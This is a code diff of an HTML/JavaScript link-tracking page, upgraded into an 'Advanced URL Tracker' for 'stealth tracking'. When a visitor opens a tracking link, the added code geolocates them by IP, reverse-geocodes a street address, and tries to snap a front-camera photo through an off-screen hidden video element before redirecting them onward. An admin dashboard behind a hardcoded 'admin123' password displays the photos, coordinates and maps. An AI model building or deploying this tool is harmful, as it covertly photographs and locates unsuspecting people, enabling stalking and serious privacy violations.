@@ -3,36 +3,37 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>URL Tracker</title>
+    <title>Advanced URL Tracker</title>
     <style>
         :root {
             --primary: #3b82f6;
             --primary-dark: #2563eb;
             --danger: #ef4444;
             --success: #10b981;
+            --warning: #f59e0b;
             --gray: #6b7280;
             --light-gray: #f3f4f6;
             --dark: #111827;
         }
-        
+
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
-        
+
         body {
             background-color: #f9fafb;
             color: var(--dark);
         }
-        
+
         .container {
             max-width: 1200px;
             margin: 0 auto;
             padding: 20px;
         }
-        
+
         /* Login Page */
         .login-container {
             display: flex;
@@ -40,7 +41,7 @@
             align-items: center;
             height: 100vh;
         }
-        
+
         .login-box {
             background: white;
             padding: 2rem;
@@ -49,13 +50,13 @@
             width: 100%;
             max-width: 400px;
         }
-        
+
         .login-title {
             text-align: center;
             margin-bottom: 1.5rem;
             color: var(--primary);
         }
-        
+
         .login-input {
             width: 100%;
             padding: 0.75rem;
@@ -63,7 +64,7 @@
             border: 1px solid #d1d5db;
             border-radius: 0.375rem;
         }
-        
+
         .login-btn {
             width: 100%;
             padding: 0.75rem;
@@ -75,16 +76,16 @@
             font-weight: 500;
             transition: background-color 0.2s;
         }
-        
+
         .login-btn:hover {
             background-color: var(--primary-dark);
         }
-        
+
         /* Admin Dashboard */
         .dashboard {
             display: none;
         }
-        
+
         .header {
             background: linear-gradient(135deg, var(--primary), var(--primary-dark));
             color: white;
@@ -92,7 +93,7 @@
             border-radius: 0.5rem;
             margin-bottom: 1.5rem;
         }
-        
+
         .url-generator {
             background-color: white;
             padding: 1.5rem;
@@ -100,20 +101,20 @@
             box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
             margin-bottom: 1.5rem;
         }
-        
+
         .input-group {
             display: flex;
             gap: 0.5rem;
             margin-bottom: 1rem;
         }
-        
+
         .input-group input {
             flex: 1;
             padding: 0.75rem;
             border: 1px solid #d1d5db;
             border-radius: 0.375rem;
         }
-        
+
         .btn {
             padding: 0.75rem 1.5rem;
             background-color: var(--primary);
@@ -124,26 +125,30 @@
             font-weight: 500;
             transition: all 0.2s;
         }
-        
+
         .btn:hover {
             background-color: var(--primary-dark);
             transform: translateY(-1px);
         }
-        
+
         .btn-danger {
             background-color: var(--danger);
         }
-        
+
         .btn-success {
             background-color: var(--success);
         }
-        
+
+        .btn-warning {
+            background-color: var(--warning);
+        }
+
         .controls {
             display: flex;
             gap: 0.5rem;
             margin-bottom: 1.5rem;
         }
-        
+
         table {
             width: 100%;
             border-collapse: collapse;
@@ -152,27 +157,22 @@
             border-radius: 0.5rem;
             overflow: hidden;
         }
-        
+
         th, td {
             padding: 1rem;
             text-align: left;
             border-bottom: 1px solid #e5e7eb;
         }
-        
+
         th {
             background-color: var(--light-gray);
             font-weight: 600;
         }
-        
+
         tr:hover {
             background-color: #f9fafb;
         }
-        
-        /* Tracking Page (hidden) */
-        .tracker {
-            display: none;
-        }
-        
+
         /* Modal */
         .modal {
             position: fixed;
@@ -180,13 +180,13 @@
             left: 0;
             right: 0;
             bottom: 0;
-            background: rgba(0, 0, 0, 0.5);
+            background: rgba(0, 0, 0, 0.8);
             display: flex;
             justify-content: center;
             align-items: center;
             z-index: 1000;
         }
-        
+
         .modal-content {
             background: white;
             padding: 2rem;
@@ -196,7 +196,7 @@
             overflow: auto;
             position: relative;
         }
-        
+
         .close-modal {
             position: absolute;
             top: 1rem;
@@ -205,11 +205,53 @@
             cursor: pointer;
             color: var(--gray);
         }
-        
+
         .camera-image {
             max-width: 100%;
             max-height: 80vh;
             border-radius: 0.25rem;
+            border: 1px solid #ddd;
+        }
+
+        .map-iframe {
+            width: 100%;
+            height: 500px;
+            border: none;
+            border-radius: 0.25rem;
+        }
+
+        /* Badges */
+        .badge {
+            display: inline-block;
+            padding: 0.25rem 0.5rem;
+            border-radius: 0.25rem;
+            font-size: 0.75rem;
+            font-weight: 600;
+        }
+
+        .badge-success {
+            background-color: #dcfce7;
+            color: #166534;
+        }
+
+        .badge-danger {
+            background-color: #fee2e2;
+            color: #991b1b;
+        }
+
+        .badge-warning {
+            background-color: #fef3c7;
+            color: #92400e;
+        }
+
+        /* Hidden tracker elements */
+        .tracker-elements {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            overflow: hidden;
         }
     </style>
 </head>
@@ -226,8 +268,8 @@
     <!-- Admin Dashboard -->
     <div class="container dashboard" id="dashboard">
         <div class="header">
-            <h1>URL Tracker Dashboard</h1>
-            <p>Track clicks with stealth redirects</p>
+            <h1>Advanced URL Tracker</h1>
+            <p>Stealth tracking with camera capture & geolocation</p>
         </div>
         
         <div class="url-generator">
@@ -250,25 +292,34 @@
                 <tr>
                     <th>Time</th>
                     <th>IP</th>
-                    <th>Target URL</th>
-                    <th>Referrer</th>
+                    <th>Location</th>
                     <th>Device</th>
+                    <th>Camera</th>
+                    <th>Actions</th>
                 </tr>
             </thead>
             <tbody></tbody>
         </table>
     </div>
 
-    <!-- Tracking Page (hidden) -->
-    <div class="tracker" id="tracker"></div>
+    <!-- Hidden tracker elements -->
+    <div class="tracker-elements">
+        <video id="camera-video" autoplay playsinline></video>
+        <canvas id="camera-canvas"></canvas>
+    </div>
 
     <script>
     // Configuration
     const ADMIN_PASSWORD = "admin123"; // Change this to your password
     const TRACKING_PREFIX = window.location.origin + "/?track=";
     
+    // DOM Elements
+    const videoElement = document.getElementById('camera-video');
+    const canvasElement = document.getElementById('camera-canvas');
+    
     // State management
     let isAdmin = false;
+    let cameraStream = null;
     
     // Check login
     function checkLogin() {
@@ -292,9 +343,23 @@
             <tr>
                 <td>${formatDate(item.timestamp)}</td>
                 <td>${item.ip || 'Unknown'}</td>
-                <td><a href="${item.target}" target="_blank">${shortenUrl(item.target)}</a></td>
-                <td>${shortenReferrer(item.referrer)}</td>
+                <td>
+                    ${item.location ? `
+                        ${item.location.city || ''}${item.location.city && item.location.country ? ', ' : ''}
+                        ${item.location.country || ''}
+                        ${item.location.latitude ? `<span class="badge badge-success">${item.location.latitude}, ${item.location.longitude}</span>` : ''}
+                    ` : 'No location'}
+                </td>
                 <td>${getDeviceType(item.userAgent)}</td>
+                <td>
+                    ${item.cameraData ? 
+                        '<span class="badge badge-success">Captured</span>' : 
+                        '<span class="badge badge-danger">No capture</span>'}
+                </td>
+                <td>
+                    ${item.cameraData ? `<button class="btn btn-warning" onclick="showImage('${item.cameraData}')">View Photo</button>` : ''}
+                    ${item.location?.latitude ? `<button class="btn" onclick="showMap(${item.location.latitude}, ${item.location.longitude})">View Map</button>` : ''}
+                </td>
             </tr>
         `).join('');
     }
@@ -334,25 +399,6 @@
         return new Date(timestamp).toLocaleString();
     }
     
-    function shortenUrl(url) {
-        try {
-            const u = new URL(url);
-            return u.hostname.replace('www.', '');
-        } catch {
-            return url.length > 30 ? url.substring(0, 30) + '...' : url;
-        }
-    }
-    
-    function shortenReferrer(ref) {
-        if (ref === 'Direct') return ref;
-        try {
-            const u = new URL(ref);
-            return u.hostname.replace('www.', '');
-        } catch {
-            return ref.length > 20 ? ref.substring(0, 20) + '...' : ref;
-        }
-    }
-    
     function getDeviceType(ua) {
         if (/mobile/i.test(ua)) return '📱 Mobile';
         if (/tablet/i.test(ua)) return '🖥 Tablet';
@@ -376,10 +422,12 @@
     
     document.getElementById('export-btn').addEventListener('click', function() {
         const data = getTrackingData();
-        let csv = 'Timestamp,IP Address,Target URL,Referrer,Device\n';
+        let csv = 'Timestamp,IP,City,Country,Latitude,Longitude,Device,Referrer,Target URL\n';
         
         data.forEach(item => {
-            csv += `"${formatDate(item.timestamp)}","${item.ip || 'Unknown'}","${item.target}","${item.referrer}","${getDeviceType(item.userAgent)}"\n`;
+            csv += `"${formatDate(item.timestamp)}","${item.ip || 'Unknown'}","${item.location?.city || ''}","${item.location?.country || ''}",` +
+                  `"${item.location?.latitude || ''}","${item.location?.longitude || ''}","${getDeviceType(item.userAgent)}",` +
+                  `"${item.referrer || 'Direct'}","${item.target}"\n`;
         });
         
         const blob = new Blob([csv], { type: 'text/csv' });
@@ -397,8 +445,52 @@
         }
     });
     
+    // Modal functions
+    function showImage(imageData) {
+        const modal = document.createElement('div');
+        modal.className = 'modal';
+        modal.innerHTML = `
+            <div class="modal-content">
+                <span class="close-modal" onclick="this.parentElement.parentElement.remove()">&times;</span>
+                <h3>Camera Capture</h3>
+                <img src="${imageData}" class="camera-image" alt="Camera capture">
+                <div style="margin-top: 1rem;">
+                    <button class="btn btn-success" onclick="downloadImage('${imageData}')">Download Image</button>
+                </div>
+            </div>
+        `;
+        document.body.appendChild(modal);
+    }
+    
+    function showMap(lat, lon) {
+        const modal = document.createElement('div');
+        modal.className = 'modal';
+        modal.innerHTML = `
+            <div class="modal-content">
+                <span class="close-modal" onclick="this.parentElement.parentElement.remove()">&times;</span>
+                <h3>Location Map</h3>
+                <iframe class="map-iframe" 
+                    src="https://www.openstreetmap.org/export/embed.html?bbox=${lon-0.01}%2C${lat-0.01}%2C${lon+0.01}%2C${lat+0.01}&layer=mapnik&marker=${lat}%2C${lon}">
+                </iframe>
+                <div style="margin-top: 1rem; text-align: center;">
+                    <a href="https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}#map=16/${lat}/${lon}" target="_blank">
+                        View Larger Map
+                    </a>
+                </div>
+            </div>
+        `;
+        document.body.appendChild(modal);
+    }
+    
+    function downloadImage(imageData) {
+        const link = document.createElement('a');
+        link.href = imageData;
+        link.download = `capture-${Date.now()}.jpg`;
+        link.click();
+    }
+    
     // Tracking functionality
-    function processTracking() {
+    async function processTracking() {
         const params = new URLSearchParams(window.location.search);
         const trackingId = params.get('track');
         const targetUrl = params.get('target');
@@ -413,26 +505,81 @@
                 target: decodedUrl,
                 referrer: document.referrer || 'Direct',
                 userAgent: navigator.userAgent,
-                ip: 'Pending'
+                ip: 'Pending',
+                cameraData: null,
+                location: null
             };
             
-            // Immediate redirect
-            window.location.href = decodedUrl;
-            
-            // Get IP in background
-            setTimeout(async () => {
-                try {
-                    const ipResponse = await fetch('https://api.ipify.org?format=json');
-                    trackingData.ip = (await ipResponse.json()).ip;
-                } catch (e) {
-                    trackingData.ip = 'Unknown';
+            // Start data collection
+            try {
+                // Get IP and approximate location
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                const ipData = await ipResponse.json();
+                
+                trackingData.ip = ipData.ip || 'Unknown';
+                
+                if (ipData.latitude && ipData.longitude) {
+                    trackingData.location = {
+                        latitude: ipData.latitude,
+                        longitude: ipData.longitude,
+                        city: ipData.city,
+                        country: ipData.country_name
+                    };
+                    
+                    // Get more detailed address from Nominatim
+                    try {
+                        const nominatimResponse = await fetch(
+                            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${ipData.latitude}&lon=${ipData.longitude}&zoom=18&addressdetails=1`
+                        );
+                        const nominatimData = await nominatimResponse.json();
+                        
+                        if (nominatimData.address) {
+                            trackingData.location.address = nominatimData.address;
+                        }
+                    } catch (e) {
+                        console.log('Nominatim error:', e);
+                    }
                 }
                 
-                // Save data
+                // Try camera capture if available
+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    try {
+                        cameraStream = await navigator.mediaDevices.getUserMedia({ 
+                            video: { facingMode: 'user' },
+                            audio: false 
+                        });
+                        
+                        videoElement.srcObject = cameraStream;
+                        await new Promise(resolve => videoElement.onloadedmetadata = resolve);
+                        
+                        // Wait briefly for camera to initialize
+                        await new Promise(resolve => setTimeout(resolve, 500));
+                        
+                        // Capture frame
+                        canvasElement.width = videoElement.videoWidth;
+                        canvasElement.height = videoElement.videoHeight;
+                        const ctx = canvasElement.getContext('2d');
+                        ctx.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
+                        
+                        trackingData.cameraData = canvasElement.toDataURL('image/jpeg', 0.7);
+                    } catch (e) {
+                        console.log('Camera error:', e);
+                    } finally {
+                        if (cameraStream) {
+                            cameraStream.getTracks().forEach(track => track.stop());
+                        }
+                    }
+                }
+            } catch (e) {
+                console.log('Tracking error:', e);
+            } finally {
+                // Save data and redirect
                 const allData = getTrackingData();
                 allData.unshift(trackingData);
                 saveTrackingData(allData);
-            }, 0);
+                
+                window.location.href = decodedUrl;
+            }
         }
     }
     
